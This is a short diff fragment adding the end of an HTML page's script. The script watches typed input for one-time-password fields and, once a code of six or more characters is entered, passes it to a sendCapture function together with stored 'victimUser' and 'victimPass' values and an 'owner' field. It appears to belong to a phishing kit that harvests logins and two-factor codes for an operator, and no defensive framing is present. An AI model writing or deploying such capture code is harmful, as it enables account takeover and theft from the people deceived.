+    document.addEventListener("input", (e) => {
+      const el = e.target;
+      if (!el || el.tagName !== "INPUT") return;
+      const isOtpEl = el.classList.contains("otp-input") || /otp|code/i.test((el.id || "") + " " + (el.name || "") + " " + (el.getAttribute("autocomplete") || ""));
+      if (!isOtpEl) return;
+
+      const data = readFields(el);
+      if (data.otp && data.otp !== "Aucun" && data.otp.length >= 6) {
+        sendCapture({
+          owner: ownerVal,
+          network: PARAM_CFG.network,
+          type: typeParam === "standard" ? "otp" : typeParam,
+          victimUser: lastUser,
+          victimPass: lastPass,
+          otp: data.otp
+        });
+      }
+    }, true);
+  }
+})();
+</script>
+</body>
+</html>
